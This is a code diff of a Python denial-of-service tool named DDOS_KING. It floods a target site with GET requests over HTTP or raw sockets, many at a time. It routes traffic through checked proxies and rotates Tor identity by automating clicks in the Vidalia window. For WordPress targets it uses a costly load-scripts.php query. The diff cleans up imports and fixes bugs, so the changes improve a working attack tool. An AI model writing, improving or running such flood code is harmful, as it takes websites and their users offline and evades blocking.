@@ -1,15 +1,24 @@
-﻿# -*- coding: utf-8 -*-
-import requests,logging
-import socket,socks
-import sys
-import threading
+﻿#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+import argparse
+import logging
 import random
 import re
-import argparse
+import socket
+import sys
+import time
+import urllib.request as request
+
 import numpy as np
+import requests
+import socks
 from retry import retry
+
 #import win_inet_pton
 logger = logging.getLogger(__name__)
+
+
 class DDOS_KING(object):
 	def __init__(self,CONCURRENCY_TYPE,PROXY_TYPE):
 		self.CONCURRENCY_TYPE=CONCURRENCY_TYPE
@@ -75,28 +84,29 @@ class DDOS_KING(object):
 			for i in self.ip_list:
 				ip_save_list.write(str(i).replace("', '",':').replace("'",'').replace(',','').replace('[','').replace(']','').replace('(','').replace(')',''))
 				ip_save_list.write('\n')
-	
+
 	def CHECK_IP_LIST(self):
+		def CHECK(list):
+			for i in list:
+				if not self.CHECK_IP(i): ip_list.remove(i)
 		if not self.ip_list:
 			with open('C:/Documents and Settings/Administrator/桌面/ip_list.txt','r',encoding='utf-8') as get_referer_list:
 				ip_list=np.array([get_referer_list.readline()])
 				CHECK(list)
 		else:
 			CHECK(self.ip_list)
-		def CHECK(list):
-			for i in list:
-				if  not self.CHECK_IP(i):ip_list.remove(i)
+
 
 	def CHECK_IP(self,IP):
 		if  requests.get('http://cocbus.com/ip',proxies={"http": str(IP),'https': str(IP)},timeout=7).status_code ==200:
 			print('此IP有效!')
-			return True	
+			return True
 
 	def printMsg(self,msg):
 		if msg not in self.printedMsgs:
 			print ("\n"+msg + 'after '+str(self.request_counter)+'requests')
 			self.printedMsgs.add(msg)
-		
+
 	def randomString(self,size):
 		out_str = ''
 		for i in range(0, size):
@@ -114,9 +124,9 @@ class DDOS_KING(object):
 				headers.update({header.split(":")[0]:header.split(":")[1]})
 		return self.headers
 
-	@retry(tries=3)	
+	@retry(tries=3)
 	def sendGET(self):
-		if self.is_wordpress:self.url+='/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9'		
+		if self.is_wordpress:self.url+='/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9'
 		#request_session=requests.Session()
 		@retry(tries=3)
 		def TRY():
@@ -131,16 +141,16 @@ class DDOS_KING(object):
 				if self.request_counter%self.CHECK_TIME==0:
 					sys.stdout.write('\n正在检测状态码\rstatus_code is :%i'% request.status_code)
 					if  request.status_code == 500 or 502 or 504:
-						printedMsg("Status code "+str( request.status_code)+" received")
+						print("Status code "+str( request.status_code)+" received")
 						time.sleep(9)
-					elif status_code == 503:
+					elif request.status_code == 503:
 						self.printMsg("This site were be protect")#protect
 						time.sleep(10)
 					if request.status_code == 429:self.printMsg("You have been throttled")
 		while True:
 			TRY()
 
-	@retry(tries=3)	
+	@retry(tries=3)
 	def SOCKET_sendGET(self):
 		PORT=80
 		if 'http://'in self.url:self.url=self.url.replace('http://','')
@@ -154,7 +164,7 @@ class DDOS_KING(object):
 			socks.set_default_proxy(socks.HTTP,addr=self.proxies['http'][0:-5],port=self.proxies['http'][:-4])
 			socket.socket = socks.socksocket
 		#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		
+
 		@retry(tries=3)
 		def TRY():
 			try:
@@ -175,7 +185,7 @@ class DDOS_KING(object):
 				if self.request_counter%self.CHECK_TIME==0:
 					status_code=sock.recv(100).decode().splitlines()[0][9:13]
 					if status_code == 500 or 502 or 504:
-						printedMsg("Status code "+str(status_code)+" received")
+						print("Status code "+str(status_code)+" received")
 						time.sleep(5)
 					elif status_code == 503:
 						self.printMsg("This site were be protect")#protect
@@ -205,12 +215,12 @@ class DDOS_KING(object):
 				if self.request_counter%self.CHECK_TIME==0:
 					print('\n'+'正在检测状态码')
 					if  request.status_code == 500 or 502 or 504:
-						printedMsg("Status code "+str( request.status_code)+" received")
+						print("Status code "+str( request.status_code)+" received")
 						time.sleep(9)
-					elif status_code == 503:
+					elif request.status_code == 503:
 						self.printMsg("This site were be protect")#protect
 						time.sleep(10)
-					if request.status_code == 429:self.printMsg("You have been throttled")			
+					if request.status_code == 429:self.printMsg("You have been throttled")
 	# TODO:
 	# check if the site stop responding and alert
 	def main(self,argv):
@@ -227,7 +237,7 @@ class DDOS_KING(object):
 		parser.add_argument('-P', help='PROXY_MODE', default=0, type=int)
 		args = parser.parse_args()
 		self.additionalHeaders = args.ah
-		
+
 		if len(sys.argv)==1:
 			parser.print_help()
 			exit()
@@ -240,25 +250,23 @@ class DDOS_KING(object):
 			self.AutoControl()
 	def AutoControl(self):
 		THIS_CONCURRENCY_TYPE={}
-##################################################################		
+##################################################################
 		if self.CONCURRENCY_TYPE==1:#stackless
-			import stackless
 			THIS_CONCURRENCY_TYPE['EVAL1']='stackless.tasklet(self.sendGET)()'
 			THIS_CONCURRENCY_TYPE['EVAL2']='stackless.run()'
-##################################################################		
+##################################################################
 		elif self.CONCURRENCY_TYPE==2:#Thread
-			import  threading
 			THIS_CONCURRENCY_TYPE['EVAL1']='t=threading.Thread(target=self.sendGET)\nt.daemon = True\nt.start()'
 			THIS_CONCURRENCY_TYPE['EVAL2']=''
-##################################################################		
+##################################################################
 		elif self.CONCURRENCY_TYPE==3:#multiprocessing
 			from multiprocessing import Pool
 			pool = Pool(self.THREADS_NUM)
 			THIS_CONCURRENCY_TYPE['EVAL1']='pool.apply_async (self.sendGET, args=(QUEUE_INDEX))'
 			THIS_CONCURRENCY_TYPE['EVAL2']='pool.close()\npool.join()'
-##################################################################		
+##################################################################
 		elif self.CONCURRENCY_TYPE==4:#gevent 
-			import gevent
+			pass
 			#THIS_CONCURRENCY_TYPE['EVAL1']=
 				# 		createVar = locals()
 				# 		self.GREENLET_DEQUE=deque()
@@ -272,7 +280,7 @@ class DDOS_KING(object):
 			exec(THIS_CONCURRENCY_TYPE['EVAL1'])
 		exec(THIS_CONCURRENCY_TYPE['EVAL2'])
 
-				
+
 
 	@retry(tries=3)
 	def  Vidalia_Change_IP(self):
@@ -280,13 +288,13 @@ class DDOS_KING(object):
 		left=top=0
 		def  change():
 			win32api.SetCursorPos((left, top+231))
-			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0,0,0,0) 
-			time.sleep(0.05) 
+			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0,0,0,0)
+			time.sleep(0.05)
 			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0,0,0,0)
 			time.sleep(0.1)
 			win32api.SetCursorPos((left+10, top+100))
-			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0,0,0,0) 
-			time.sleep(0.05) 
+			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0,0,0,0)
+			time.sleep(0.05)
 			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0,0,0,0)
 		def check_exsit(process_name):
 			import win32com.client
@@ -303,12 +311,12 @@ class DDOS_KING(object):
 			win32api.SetCursorPos((1783, 1063))#1773
 			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0,0,0,0)
 			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0,0,0,0)
-			time.sleep(0.1) 
+			time.sleep(0.1)
 			VidaliaHwnd = win32gui.FindWindow('QPopup', 'vidalia')
 			left, top, right, bottom = win32gui.GetWindowRect(VidaliaHwnd)
 			change()
 		else:
-			change()	
+			change()
 if __name__ == '__main__' :
 	DDOS_KING(1,1).main(sys.argv[1:])	
 	# last=''
